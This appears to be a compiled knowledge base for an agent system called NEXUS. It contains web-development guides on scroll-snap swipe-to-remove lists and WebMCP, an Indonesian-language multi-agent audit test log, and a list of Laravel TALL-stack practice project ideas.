    for (const m of mutations) {
      for (const node of m.addedNodes) {
        if (node.classList?.contains('Stack-view')) viewObserver.observe(node);
      }
      for (const node of m.removedNodes) {
        if (node.classList?.contains('Stack-view')) viewObserver.unobserve(node);
      }
    }
  }).observe(stack, {childList: true});

  // Catch up to any views already in the stack at the time this code
  // runs (typically the initial view appended in step 8).
  for (const view of stack.children) viewObserver.observe(view);
}
```

#### Scroll-driven animations

Scroll-driven animations has limited availability.
Supported by: Chrome 115 (Jul 2023), Edge 115 (Jul 2023), and Safari 26 (Sep 2025).
Unsupported in: Firefox.

The scroll-driven parallax / dim / shadow effect is a progressive enhancement on top of the navigation core. The CSS `@supports (animation-timeline: view())` gate (shown in step 2) confines the animation to supporting browsers; everywhere else the views simply cut between snap stops with no transition. The component is fully functional without the parallax — snap, history sync, focus management, and `inert` all still work.

If a parallax fallback is required for older baseline targets, attach a `scroll` listener to the stack and write a CSS custom property describing each view's progress through the scrollport, then drive `transform` and `filter` from that property:

```js
if (!CSS.supports('animation-timeline: view()')) {
  stack.addEventListener('scroll', () => {
    const viewWidth = stack.clientWidth;
    for (const view of stack.children) {
      // Progress: 0 when this view is centered, 1 when it has fully
      // exited to the left. Matches the @keyframes mapping above.
      const offsetLeft = view.offsetLeft - stack.scrollLeft;
      const progress = Math.min(1, Math.max(0, -offsetLeft / viewWidth));
      const content = view.querySelector('.Stack-viewContent');
      content.style.transform = `translateX(${progress * 75}%)`;
      content.style.filter = `brightness(${1 - progress * 0.2})`;
    }
  });
}
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_SWIPE-TO-REMOVE.MD

# Swipe to remove
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Swipe-to-remove patterns are common in mobile applications but can be challenging to implement cleanly on the web. By using CSS Scroll Snap, you can create a smooth, native-feeling swipe interaction that hooks directly into the browser's scrolling engine. This ensures high performance and physics-based momentum without needing a complex JavaScript gesture library.

The same pattern works for any single-action swipe (remove, archive, mark as read, snooze). The action visuals change; the mechanics do not.

## How to implement

The component has two layers: a **list** (the `<ul>`) and the **items** inside it. Each item is structured as an outer `<li>`, an inner scroll **track** (the scroll container with the snap points), and a **content** element (the visible row). The action's revealed UI (trash icon, archive label, etc.) lives on either side of the content. The list owns shared wiring (lazy item setup, picking up newly added items); each item owns its own swipe detection.

### Step 1: Mark up the list with track and content

```html
<ul class="SwipeableList">
  <li id="list-item-1" class="SwipeableList-item">
    <div class="SwipeableList-track">
      <div class="SwipeableList-content">Item One</div>
    </div>
  </li>
  <li id="list-item-2" class="SwipeableList-item">
    <div class="SwipeableList-track">
      <div class="SwipeableList-content">Item Two</div>
    </div>
  </li>
  <!-- ...more items... -->
</ul>
```

### Step 2: Configure the track as a horizontal snap container with three snap points

The track has three full-width columns: a left spacer (`::before`), the content, and a right spacer (`::after`). Snapping to a spacer means the content is fully off-screen, which is the rest position after a committed swipe.

The track configuration is gated behind an `.is-initialized` class on the list item. Before JS upgrades the row, the item just renders as plain content with no horizontal scroller. The class is added in Step 4 once the JavaScript that detects swipes has been wired up. This ensures the user cannot swipe before the functionality is ready.

```css
.SwipeableList {
  list-style: none;
}

.SwipeableList-item {
  /* Establishes a containing block for the absolutely positioned action
     icons (Step 3) and clips overflow during the row's removal
     animation (Step 4). */
  contain: content;
}

/* The track only becomes a scroll snap container after JS upgrades
   the row by adding `.is-initialized` (see Step 4). */
.SwipeableList-item.is-initialized .SwipeableList-track {
  /* Three full-width columns: left spacer | content | right spacer.
     Width is 100% of the track, so each column fills the viewport row. */
  display: grid;
  grid-template-columns: 100% 100% 100%;

  /* Horizontal scroll only; vertical overflow is clipped so the
     reveal stays inside the row. */
  overflow: scroll clip;

  /* Prevent the swipe from chaining into the page scroll or browser
     back-gesture on iOS/Android. */
  overscroll-behavior-x: none;

  /* Hide the scrollbar; the gesture is the affordance. */
  scrollbar-width: none;

  /* `mandatory` ensures the track always rests on a snap point
     (spacer or content), never partially scrolled. */
  scroll-snap-type: x mandatory;
}

/* Spacers act as the left and right snap targets, AND carry the action's
   reveal color. As the user swipes, the colored spacer slides into view,
   which is what the user sees behind the content. */
.SwipeableList-item.is-initialized .SwipeableList-track::before,
.SwipeableList-item.is-initialized .SwipeableList-track::after {
  content: '';

  /* `scroll-snap-align` is required to make this a valid snap target,
     but the specific value (`start`/`center`/`end`) doesn't matter here
     because each snap point spans the full width of the scroll
     container, so all alignments resolve to the same resting position. */
  scroll-snap-align: start;

  /* `hsl(0 65% 50%)` is an example value; pick whatever fits your
     design (red here signals "delete"; use a different color for
     archive, mark-as-read, etc.). */
  background-color: hsl(0 65% 50%);
}

.SwipeableList-content {
  /* The content sits above the action icons (Step 3), so it covers
     them until the user swipes. */
  position: relative;
  z-index: 2;

  /* Required to make the content a valid snap target (its resting
     position). As with the spacers above, the specific value doesn't
     matter because the snap points are full-width. */
  scroll-snap-align: start;

  /* The content must paint over the revealed spacer color. */
  background: Canvas;

  /* Row separator (example value; customize to taste). */
  border-bottom: 1px solid #eee;
}

/* Gate `scroll-initial-target` behind `.is-initialized` so it only
   applies once the track is actually a scroll container. Setting it on
   the content before then would let the property walk up to the nearest
   scrollable ancestor (typically the document) and shift the page's
   initial scroll position to bring this row's content into view. With
   the gate, the rule is only live when the row's own track can satisfy
   it, so the initial scroll happens inside the track as intended. */
.SwipeableList-item.is-initialized .SwipeableList-content {
  scroll-initial-target: nearest;
}

/* The track is the focusable scroll container, but its overflow is clipped
   so a default focus ring on the track itself would be invisible. Project
   the focus affordance onto the content element (which paints above the
   track) using `:focus-visible` on the track. */
.SwipeableList-track:focus-visible .SwipeableList-content {
  outline: auto;
  outline-offset: -2px;
}
```

### Step 3: Add the action icons to the list item

The action color lives on the spacers (Step 2). The action **icon** lives on the list item itself, anchored to the row's left and right edges.

> **Note:** Throughout this guide, "left" refers to the *left side of the row* (which is revealed by swiping right), and "right" refers to the *right side of the row* (revealed by swiping left).

The placement, sizing, and motion below are a **starting suggestion**, not a requirement. Adjust the icon size, edge insets, threshold-pop scale, transition duration, and even the choice of pseudo-elements vs. real DOM nodes to match your design. The only mechanical requirement is that the icon sits behind the content (so the content can cover it pre-swipe) and inside the list item (so it doesn't scroll with the spacer). Everything else is taste.

```css
/* Action icons painted on the list item. They're absolutely positioned
   inside the row (which is a containing block thanks to `contain: content`
   on `.SwipeableList-item` from Step 2) and sit at z-index 1, so the
   content element (z-index 2) covers them until the user swipes far
   enough. */
.SwipeableList-item.is-initialized::before,
.SwipeableList-item.is-initialized::after {
  /* Inline an SVG as the action icon. Replace this with whatever icon
     fits the action (archive, checkmark, clock, etc.). The `fill='white'`
     is baked into the SVG so it contrasts with the red spacer background;
     adjust if your background color is light. */
  --action-icon: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 3v1H4v2h1v13a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V6h1V4h-5V3H9zm0 5h2v9H9V8zm4 0h2v9h-2V8z'/></svg>");

  content: '';
  position: absolute;
  z-index: 1;

  /* The size (`width`) and insets (`left`/`right` below) are example
     values, tune them to match your row height and visual weight.
     The icon fills its box via `background-size: contain`, so changing
     `width` resizes it. */
  width: 1.5em; /* example value, adjust to taste */
  aspect-ratio: 1;
  top: 50%;
  translate: 0 -50%;

  /* Smooth transitions for the icon's visual states: the activate-point
     pop (`scale`, see `.is-activating` below) and the removal fade
     (`scale` + `opacity`, see `.is-removing` below). 0.2s is an example
     duration. */
  transition: scale 0.2s ease, opacity 0.2s ease;

  background: var(--action-icon) center / contain no-repeat;
}
/* Inset from the row edge (example values; adjust to match your layout). */
.SwipeableList-item.is-initialized::before { left: 1.5em; }
.SwipeableList-item.is-initialized::after  { right: 1.5em; }

/* Activating pop: scale the icon up when the user is past the visual
   activate point, so the row's affordance feels reactive. Toggled by JS
   in Step 4. */
.SwipeableList-item.is-activating::before,
.SwipeableList-item.is-activating::after {
  scale: 1.333;
}

/* Removal affordance: fade and shrink the icons as the row collapses.
   Driven by the `is-removing` class added in Step 4 at commit time;
   the existing `transition` on the icons animates the change. */
.SwipeableList-item.is-removing::before,
.SwipeableList-item.is-removing::after {
  scale: 0.5;
  opacity: 0;
}

/* Only show the icon on the *leading* side of the swipe; hide the
   trailing-side one. `data-swipe-direction` is set by JS in Step 4. */
.SwipeableList-item.is-activating[data-swipe-direction="left"]::after,
.SwipeableList-item.is-activating[data-swipe-direction="right"]::before {
  visibility: hidden;
}
```

### Step 4: Detect the commit gesture with `IntersectionObserver`

Use `IntersectionObserver` rooted at the track, observing the content. As the user swipes, the content's intersection ratio with the track drops; we use **two thresholds**:

- `activateThreshold`: a high ratio (e.g., 0.8). When the visible portion of the content drops below this, the user is past the visual activate point. Toggle the icon-pop affordance.
- `commitThreshold`: a low ratio (e.g., 0.2). When the visible portion drops below this, the user has committed. Start the remove animation **immediately**, without waiting for the snap gesture to fully settle. The collapsing row blends into the user's continuing swipe momentum, which feels more responsive than waiting for the snap to land before reacting.

Two more concerns are handled here:

- **Lazy per-item setup**: a single outer `IntersectionObserver` rooted at the viewport drives setup and the start/stop of the inner swipe observers. Items only get wired up the first time they scroll into view, and items that scroll off-screen have their swipe observer paused. This keeps the active observer count bounded and avoids reading layout-dependent values (like `clientWidth`) before the item has been rendered.
- **Dynamic items**: real lists grow over time (initial render, infinite scroll, server push). A `MutationObserver` on the `<ul>` registers any newly added items with the outer observer.

```js
// Per-item handles. Populated when an item is first lazily wired up; read by
// the outer viewport observer to start/stop the inner observer as items enter
// and leave the viewport.
const swipeObservers = new WeakMap();

// Outer observer: drives the entire swipe lifecycle off viewport visibility.
// On first entry, lazily wires the item up (`setupItem` reads layout-dependent
// values like `clientWidth`, which return 0 until the item is rendered). After
// setup, starts the inner observer. On exit, stops the inner observer so
// offscreen items don't track scroll positions.
const viewportObserver = new IntersectionObserver((entries) => {
  for (const entry of entries) {
    const item = entry.target;
    if (entry.isIntersecting) {
      const handle = swipeObservers.get(item) ?? setupItem(item);
      handle.observer.observe(handle.content);
    } else {
      const handle = swipeObservers.get(item);
      if (handle) handle.observer.unobserve(handle.content);
    }
  }
});

function setupItem(item) {
  const track = item.querySelector('.SwipeableList-track');
  const content = track.querySelector('.SwipeableList-content');

  // Upgrade the row into "swipeable" mode. This is the gate for all the CSS
  // from Steps 2 and 3 (the track becomes a snap container, the action icons
  // appear). Done *before* the inner observer is attached so the snap
  // container exists by the time intersection callbacks can fire.
  item.classList.add('is-initialized');

  // Tunable thresholds. `activateThreshold` is the visual feedback point
  // (icon pops). `commitThreshold` is the point of no return: once the
  // content is past this point of being off-screen, we commit even if the
  // user releases mid-gesture and the track snaps back. A low value (~0.2)
  // commits before the snap settles, so the remove animation can start
  // during the swipe.
  const activateThreshold = 0.8;
  const commitThreshold = 0.2;

  // One inner observer per item, rooted at the track. Vertical scrolling of
  // the outer list moves root and target together, so the callback only fires
  // for the horizontal swipe.
  const observer = new IntersectionObserver((entries, observer) => {
    const entry = entries.at(-1);
    const ratio = entry.intersectionRatio;

    // Direction the user is swiping toward. A positive offset from the
    // track's left edge means the content has been pulled right (left
    // spacer revealed), so the leading icon is on the left.
    const direction = (entry.boundingClientRect.x - entry.rootBounds.x) > 0
      ? 'left'
      : 'right';

    if (ratio < commitThreshold) {
      // The IO entry's boundingClientRect is the last reliable measurement
      // before the animation starts; reuse it for both the pre-collapse
      // height and the slide-off translate distance.
      removeItem(item, content, direction, entry);
      viewportObserver.unobserve(item);
      observer.disconnect();
      return;
    }

    // Scale up the leading icon while the content is past the activate
    // point; restore it at rest.
    item.classList.toggle('is-activating', ratio < activateThreshold);

    // Hold the previous direction at rest so the icon's exit animation
    // finishes on the side the user was swiping toward.
    if (entry.boundingClientRect.x !== entry.rootBounds.x) {
      item.dataset.swipeDirection = direction;
    }
  }, {
    root: track,
    threshold: [commitThreshold, activateThreshold],
  });

  // Return the handle without starting observation; the outer viewport observer
  // calls `observer.observe(content)` once the item is in view.
  const handle = {observer, content};
  swipeObservers.set(item, handle);
  return handle;
}

async function removeItem(item, content, direction, entry) {
  const opts = { duration: 300, easing: 'ease', fill: 'forwards' };

  const rect = entry.boundingClientRect;
  // Content's pixel offset from the track's left edge.
  const x = rect.x - entry.rootBounds.x;
  // Pixel distance the content needs to travel to be fully out of view.
  const translate = direction === 'left'
    ? rect.width - x
    : -(x + rect.width);

  // Use a combination of CSS transitions (for declarative styles) and
  // WAAPI animations (for computed values) to remove the element,
  // then await the completion of all of them.
  // Note: the content translate animation is important because the
  // height-collapse animation can otherwise finish before the browser's
  // smooth scroll-snap has scrolled the content fully off-screen.
  item.classList.add('is-removing');
  item.animate([{ height: `${rect.height}px` }, { height: '0px' }], opts);
  content.animate([{ translate: `${translate}px` }], opts);
  await Promise.allSettled(
    item.getAnimations({ subtree: true }).map((a) => a.finished),
  );

  // Safari has a scroll-latching bug: removing the node while the swipe
  // gesture's momentum is still resolving causes the next item (which
  // slides up into this one's place) to inherit the scroll and
  // immediately scroll itself off-screen. Detect Safari via
  // `GestureEvent` (a Safari-only API) and defer the actual DOM removal
  // until the gesture has fully settled. The 5s delay is conservative;
  // anything longer than the momentum tail is fine. Mark the row inert
  // so it can't be interacted with during the delay.
  if (globalThis.GestureEvent) {
    item.inert = true;
    setTimeout(() => item.remove(), 5000);
  } else {
    item.remove();
  }
}

function setupList(list) {
  // Observe items already in the list.
  for (const item of list.children) {
    if (item.matches('.SwipeableList-item')) {
      viewportObserver.observe(item);
    }
  }

  // Pick up items added later (initial render after data loads, infinite
  // scroll, server push). Removals don't need MutationObserver handling —
  // the commit branch above already unobserves the item before removing it
  // from the DOM.
  new MutationObserver((mutations) => {
    for (const mutation of mutations) {
      for (const node of mutation.addedNodes) {
        if (node.nodeType === Node.ELEMENT_NODE &&
            node.matches('.SwipeableList-item')) {
          viewportObserver.observe(node);
        }
      }
    }
  }).observe(list, { childList: true });
}

document.querySelectorAll('.SwipeableList').forEach(setupList);
```

### Step 5: Use the action and label that fits your use case

For variants other than removal, only the visuals and the body of the commit handler change:

- **Archive**: green/blue background, archive icon, move the item to an archive list rather than removing it.
- **Mark as read**: subdued background, checkmark icon, update item state and re-render (or just remove a `.unread` class).
- **Snooze**: blue background, clock icon, hide until a chosen time.

The scroll/snap/observation mechanics are unchanged.

#### Different actions per swipe direction

A single row can also expose **two different actions**: one for a left swipe and one for a right swipe (e.g., "archive" on right, "delete" on left), the way many native mail apps do it. The scroll, snap, and commit-detection mechanics don't change at all — the only thing that changes is what happens at commit time.

In Step 4, the commit branch always calls `removeItem(...)`. To support two actions, pick the handler based on `direction`:

```js
if (ratio < commitThreshold) {
  const handler = direction === 'left' ? archiveItem : removeItem;
  handler(item, content, direction, entry);
  viewportObserver.unobserve(item);
  observer.disconnect();
  return;
}
```

A note on naming: `removeItem` is named for the destructive case, but the function it runs (collapse the row's height, slide the content off-screen, then drop the node) is really a generic "this row is done, animate it away" routine. It works just as well for archive, mark-as-read, or snooze — the row goes away from *this* list either way. If your handlers don't actually remove anything (e.g., both move the item elsewhere), rename it to something neutral like `dismissItem` so the code reads correctly.

To make the two actions visually distinct, hoist a color and icon for each direction onto the list item, then paint the track with a split gradient and the two pseudo-element icons from the same variables.

```css
.SwipeableList-item {
  /* Action color + icon per swipe direction. `--left-*` is revealed
     when the user swipes RIGHT (e.g., archive); `--right-*` is revealed
     when the user swipes LEFT (e.g., delete). */
  --left-action-color: hsl(140 50% 40%);
  --left-action-icon: url("…archive svg…");
  --right-action-color: hsl(0 65% 50%);
  --right-action-icon: url("…trash svg…");
}

.SwipeableList-item.is-initialized .SwipeableList-track {
  /* Split reveal: left half of the scrollable area gets the left-action
     color, right half gets the right-action color. `background-attachment:
     local` makes the gradient's positioning area the scrollable area
     (3x the visible width), so the default size fills it and the 50% hard
     stop lines up exactly with the midpoint of the resting content column.
     The track's color also stays continuous behind the content as it
     translates off, so the leading-direction color shows the whole way. */
  background-image: linear-gradient(
    to right,
    var(--left-action-color) 50%,
    var(--right-action-color) 50%
  );
  background-attachment: local;
}

/* Per-side icons read from the same variables. */
.SwipeableList-item.is-initialized::before { background-image: var(--left-action-icon); }
.SwipeableList-item.is-initialized::after  { background-image: var(--right-action-icon); }
```

With this setup, the spacers no longer need their own background-color (the track's gradient handles the reveal), so you can drop the `background-color` rule on `.SwipeableList-track::before, ::after` from Step 2 if you're using this dual-action variant.

## Best practices and pitfalls

- **DO** use `mandatory` snap, not `proximity`. With `proximity`, the row can rest partially scrolled, leaving the action background half-visible.
- **DO** set `overscroll-behavior-x: none` on the track. Without it, an over-swipe can trigger the browser's back-navigation gesture on iOS/Android.
- **DO** commit at a threshold *before* the snap settles (e.g., `commitThreshold ≈ 0.2`) rather than waiting for the content to be fully off-screen. This lets the remove animation start during the gesture, which feels significantly more responsive than waiting for the snap to land.
- **DO** drive per-item setup from an outer viewport `IntersectionObserver` rather than wiring every item up at page load. This avoids reading layout-dependent values (`clientWidth`, etc.) before items have been rendered, and keeps the active observer count proportional to what the user can actually see.
- **DO** use a `MutationObserver` on the list when items are added dynamically (initial render after data loads, infinite scroll, server push). Without it, items appended after page load won't get wired up.
- **DO NOT** rely on `pointerdown`/`pointermove`/`pointerup` to drive a manual transform. You'll lose momentum, snap-back, keyboard accessibility, and reduced-motion handling that the browser gives you for free.
- **DO** confirm destructive actions when appropriate. For "remove", consider showing an undo toast after the swipe completes; the gesture is fast and easy to trigger by accident.
- **DO** ensure the scroll track is focusable, keyboard accessible, and that there is a visual focus affordance.
- **DO** provide accessible alternatives for any relevant actions triggered by the swipe (e.g., a visible button, context menu, or edit mode).

## Fallback strategies

The scroll-snap mechanics that underpin this pattern (`scroll-snap-type`, `scroll-snap-align`), `IntersectionObserver`, `MutationObserver`, `ResizeObserver`, and the Web Animations API are all Baseline Widely Available, so the gesture, commit detection, lifecycle management, and removal animation work broadly. All newer features that are used are either not core to the experience or have robust fallbacks that can be reliably used now.

### Fallback for `overscroll-behavior`

overscroll-behavior has limited availability.
Supported by: Chrome 144 (Jan 2026), Edge 144 (Jan 2026), and Firefox 150 (Apr 2026).
Unsupported in: Safari.

No fallback is needed for this use case. `overscroll-behavior` was Baseline Widely Available but no longer is due to an interop issue that only manifests on containers without scrollable overflow. But the track here is always horizontally scrollable (three full-width columns inside a 100%-width container), so the property behaves consistently across browsers and the swipe gesture is reliably contained.

### Fallback for `scrollbar-width`

Baseline status for scrollbar-width: Newly available. It's been Baseline since 2024-12-11.
Supported by: Chrome 121 (Jan 2024), Edge 121 (Jan 2024), Firefox 64 (Dec 2018), and Safari 18.2 (Dec 2024).

Hidden scrollbars are a visual enhancement, not the mechanism that makes swipe-to-remove work. If your Baseline target does not include `scrollbar-width`, the row still scrolls, snaps, detects commit, and removes correctly; the unsupported experience may simply show a horizontal scrollbar. If your product requires hidden scrollbars in older WebKit-derived browsers, you can add a narrowly scoped `::-webkit-scrollbar { display: none; }` rule for the swipe track.

### Fallback for `scroll-initial-target`

scroll-initial-target has limited availability.
Supported by: Chrome 133 (Feb 2025) and Edge 133 (Feb 2025).
Unsupported in: Firefox and Safari.

If your Baseline target does not include `scroll-initial-target`, scroll the track to the content programmatically inside `setupItem`. Detect with `CSS.supports`:

```js
// Hoist the feature detect so the conditional `ResizeObserver` below can be
// skipped entirely when the property is supported.
const needsScrollWorkaround = !CSS.supports('scroll-initial-target', 'nearest');

function setupItem(item) {
  // ...existing setup from Step 4...

  if (needsScrollWorkaround) {
    track.scrollLeft = track.clientWidth;
  }

  // ...attach the inner IntersectionObserver, etc.
}
```

**Call ordering matters.** The programmatic scroll MUST run:

1. **AFTER** `.is-initialized` is added to the list item (the class is what turns the track into a scroll container; setting `scrollLeft` on a non-scrollable element is a no-op).
2. **BEFORE** the inner `IntersectionObserver` from Step 4 is attached. Otherwise the initial programmatic scroll past the left spacer will be observed as a "swipe" and immediately fire the commit handler.

Driving setup from the outer viewport observer (Step 4) is what makes this reliable: `setupItem` runs after the item is rendered, so `track.clientWidth` returns a real value rather than `0`.

Some browsers (notably Safari) also reset the snap-container scroll position whenever the track resizes (URL-bar show/hide, viewport resize, container queries, etc.). Use a `ResizeObserver` on each track to re-apply the scroll. Gate it behind the same `CSS.supports` check — when `scroll-initial-target` is supported, the browser handles resize-time scroll restoration itself.

```js
const trackResizeObserver = needsScrollWorkaround
  ? new ResizeObserver((entries) => {
      for (const entry of entries) {
        entry.target.scrollLeft = entry.target.clientWidth;
      }
    })
  : null;

function setupItem(item) {
  // ...existing setup...

  if (needsScrollWorkaround) {
    track.scrollLeft = track.clientWidth;
    trackResizeObserver.observe(track);
  }

  // ...attach the inner IntersectionObserver, etc.
}
```

Unobserve the track before the row's height animation runs in `removeItem`, otherwise the height change re-triggers the resize callback during removal. Add this alongside the existing `viewportObserver.unobserve(item)` in the commit branch:

```js
if (ratio < commitThreshold) {
  removeItem(item, content, direction, entry);
  viewportObserver.unobserve(item);
  if (needsScrollWorkaround) trackResizeObserver.unobserve(track);
  observer.disconnect();
  return;
}
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_TDD_INSIGHTS.MD

# 🧠 NEXUS INSIGHT: TDD Project #1 Conclusions
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, vcs, tdd, laravel, nexus_institutionalized]

## 📝 Kesimpulan Strategis
1. **Inkonsistensi Model-Migration**: Berhasil dideteksi oleh `SchemaGuard` dan `database-architect`.
2. **Keamanan Hardcoded**: `database-architect` berhasil mendeteksi string koneksi dalam file JS.
3. **Kesenjangan Perangkat (Gap Analysis)**: Sistem membutuhkan modul perbaikan otomatis khusus Laravel (`laravel-architect-actions.js`).

## 🚀 Insight Operasional
Protokol multi-agent terbukti stabil dalam menjalankan siklus audit paralel tanpa tabrakan memori.

---
*Verified by Nexus Engine - TDD Project #1*

### 📘 KNOWLEDGE: NEXUS_TDD_PROJECT_1_LOG.MD

# 🚀 TDD Project #1 Log: Intelligent CRUD Auditor
**Target**: `tests/project1`
**Date**: 07/05/2026
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, vcs, tdd, laravel, nexus_institutionalized]

## 🧐 Problem Statement
Mendeteksi inkonsistensi antara Model Laravel dan Migration, serta menemukan celah keamanan database (hardcoded strings).

---

## 🔍 [1/4] Audit Phase
**Status**: COMPLETED
**Audit ID**: `AUDIT-1778142921955`

### Key Findings:
1.  **Database Security**: Hardcoded connection string found in `config/database.js`. (Database Architect)
2.  **VCS Governance**: `.gitignore` missing. (VCS Architect)
3.  **Schema Governance**: `User` model missing `HasUuids` trait. (SchemaGuard)
4.  **Structure**: Standard Nexus folders and README are missing.

---

## 📅 [2/4] Planning Phase
**Status**: COMPLETED
**Plan ID**: `PLAN-1778142974753`

### Implementation Strategy:
*   **Fix 1-4**: Manual structure creation (Engine skipped auto-fix as no pattern matched).
*   **Fix 5**: Hardcoded DB string needs moving to `.env`.
*   **Fix 6**: `.gitignore` generation.
*   **Fix 8**: UUID Trait injection into `User.php`.

---

## 🚀 [3/4] Execution Phase
**Status**: COMPLETED (Partial)
**Tasks**: 8/8 processed by Orchestrator.
**Note**: Sebagian besar perbaikan bersifat rekomendasi karena ketiadaan modul "Auto-Fixer" spesifik untuk Laravel Blueprint dalam core saat ini.

---

## 🔍 [4/4] Re-Audit Phase
**Status**: COMPLETED
**Audit ID**: `AUDIT-1778143001765`
**Observation**: Temuan tetap sama. Ini memvalidasi bahwa agen spesialis bekerja secara konsisten dalam mendeteksi masalah, namun alur "Auto-Execution" memerlukan penambahan *Machine Actions* khusus untuk Laravel Blueprint.

---

## 📝 Final Summary & Pipeline Insight
**Status**: SUCCESSFUL TEST
**Kesimpulan**: 
1.  **Multi-Agent Stability**: Agen spesialis (`database-architect`, `vcs-architect`, `documentation-architect`) berhasil berkolaborasi dalam satu siklus tanpa tabrakan.
2.  **Observability**: Trace ID dan Log korelasi tercatat dengan benar di `logs/orchestration`.
3.  **Gap Analysis**: NEXUS memerlukan modul `laravel-architect-actions.js` untuk melakukan perbaikan fisik otomatis pada file PHP/Laravel.
4.  **Pipeline Ready**: Bahan dokumentasi ini sudah cukup untuk menjadi referensi *Learning* bagi agen di siklus berikutnya.

---
*End of Project #1 Test Log*

### 📘 KNOWLEDGE: NEXUS_WEBMCP.MD

# WebMCP (Web Model Context Protocol)
> **VERSION**: v1 | **Last Updated**: 26/05/2026



WebMCP is a browser-native JavaScript API that allows web pages to expose their client-side functionality as structured "tools" to AI agents, browser assistants, and assistive technologies. 

IMPORTANT: WebMCP is currently in Early Preview on Chromium-based browsers (such as Chrome and Edge). It requires Chromium version `146.0.7672.0` or higher and the `#enable-webmcp-testing` flag.

**Crucial Distinction:** WebMCP runs entirely **client-side** in the browser tab. It is *not* a backend server, and it does *not* use HTTP, Server-Sent Events (SSE), or `stdio` transports. The web page itself acts as the tool registry.

Currently, WebMCP **only supports Tools**. It does not support the "Resources" or "Prompts" primitives found in the backend Model Context Protocol.

## Quick Overview

- **Imperative API**: Use `navigator.modelContext.registerTool()` for complex logic and dynamic interactions.
- **Declarative API**: Annotate standard HTML `<form>` elements with `toolname` and `tooldescription` to turn them into tools.

## Best Practices

* **Naming and Semantics**: Use specific verbs describing exact behavior (e.g. `create-event` vs `start-event-creation-process`). Favor positive descriptions over listing limitations.
* **Schema Design**: Accept raw user input (avoid agent math/calculation). Ensure all parameters have specific types and explain the purpose of options.
* **Reliability**: Validate constraints in code and return descriptive errors for retries. Handle rate limiting gracefully. Ensure the function returns *after* UI state updates for consistency.
* **Tool Strategy**: Tools should be atomic, composable, and distinct. Do not force flow control instructions ("Don't call B after A") — let the agent decide. Register/unregister tools dynamically depending on the current page context. Use `annotations: { readOnlyHint: true }` (placed after `execute`) for tools that do not modify state to inform the agent of safe execution.
* **Clean Up**: Always use `AbortSignal` to unregister tools when pages transition or resources are released to avoid leaks and collisions. Do not use `unregisterTool`.
* **Web Development Best Practices**: WebMCP tools run as client-side JavaScript in the browser tab. They must adhere to regular web development best practices (e.g., keeping secrets out of client-side code, accessing backend databases through secure API layers, and using Web Workers, WASM, or WebGPU for heavy compute).

### When to Discourage WebMCP
* **High-Risk Actions without Guardrails**: Avoid auto-submitting tools for destructive or irreversible actions (e.g., deleting data) unless the UI requires manual user confirmation outside the agent's control.
* **Hyper-Dynamic State**: If data changes faster than the agent can react, it may work with stale context.

### Anti-Patterns & Warnings (DO NOT DO THIS)

* **Do not use backend transports.** WebMCP is for browser tabs, not Node.js background processes.
* **Do not include Resources or Prompts.** These are not supported in the current WebMCP spec.
* **Do not ignore `inputSchema` structure.** Always provide clear descriptions for every parameter to minimize agent hallucinations.
* **Do not use outside of a Secure Context (HTTPS).**

## Implementation Status

WebMCP is currently in early preview in Chromium-based browsers (e.g., Chrome, Edge):

* **Current Status**: Early preview.
* **Required Version**: Chromium `146.0.7672.0` or higher.
* **Activation**: Requires enabling the flag `chrome://flags/#enable-webmcp-testing` or `edge://flags/#enable-webmcp-testing`.
* **Specification**: Evolving [Draft Community Group specification](https://webmachinelearning.github.io/webmcp/); not yet a standards-track recommendation.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_100 PROJECT TEST TALL STACK.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## 1. Fundamental CRUD & Auth Projects [Tags: crud, auth, basic, phase-1]
   Todo App realtime
   Notes App dengan tagging
   Bookmark manager
   Habit tracker
   Expense tracker pribadi
   Daily journal app
   Contact manager
   Password manager UI
   URL shortener
   Personal portfolio CMS
## 2. Dashboard & Admin Panel [Tags: dashboard, admin, analytics, phase-1]
   Admin dashboard analytics
   User management system
   Role & permission manager
   Audit log dashboard
   System monitoring dashboard
   Inventory dashboard
   Multi-tenant admin panel
   Subscription management dashboard
   CRM sederhana
   ERP mini system
## 3. Authentication & Security Focus [Tags: security, auth, oauth, phase-2]
   2FA authentication system
   OAuth login integration
   Magic link authentication
   Session management dashboard
   API token manager
   Device activity tracker
   Login anomaly detector
   Email verification workflow
   Password reset flow custom
   Secure file vault
## 4. Realtime & Livewire Intensive [Tags: realtime, livewire, websocket, phase-2]
   Live chat application
   Realtime notification center
   Collaborative notes app
   Multiplayer quiz app
   Live polling system
   Realtime kanban board
   Customer support dashboard
   Stock monitoring dashboard
   Realtime queue monitor
   Live auction platform
## 5. SaaS-Oriented Projects [Tags: saas, billing, multi-tenant, phase-3]
   Invoice SaaS
   Subscription billing platform
   Project management SaaS
   Team collaboration app
   Time tracking SaaS
   Appointment booking SaaS
   Social media scheduler
   File sharing SaaS
   Resume builder SaaS
   Form builder SaaS
## 6. E-Commerce Systems [Tags: ecommerce, marketplace, pos, phase-3]
   Toko online lengkap
   Multi-vendor marketplace
   POS system
   Digital product marketplace
   Food ordering app
   Flash sale platform
   Membership ecommerce
   Dropshipping dashboard
   Affiliate tracking system
   Warehouse management app
## 7. Advanced Livewire Components [Tags: ui, components, alpine, phase-2]
   Drag-and-drop page builder
   Kanban drag-and-drop
   Dynamic form generator
   Reusable datatable package
   Nested comments system
   Dynamic filtering engine
   Realtime search engine
   Infinite scrolling feed
   Media uploader with preview
   Spreadsheet-like editor
## 8. API & Integration Heavy [Tags: api, integration, webhooks, phase-3]
   Payment gateway integration platform
   Email campaign manager
   WhatsApp gateway dashboard
   SMS broadcast platform
   Weather dashboard API
   Cryptocurrency tracker
   AI chatbot dashboard
   OpenAI content generator
   Social media analytics aggregator
   Logistics tracking system
## 9. Enterprise-Level Architectures [Tags: enterprise, hr, school, hospital, phase-4]
   HR management system
   School management system
   Hospital management system
   Manufacturing workflow app
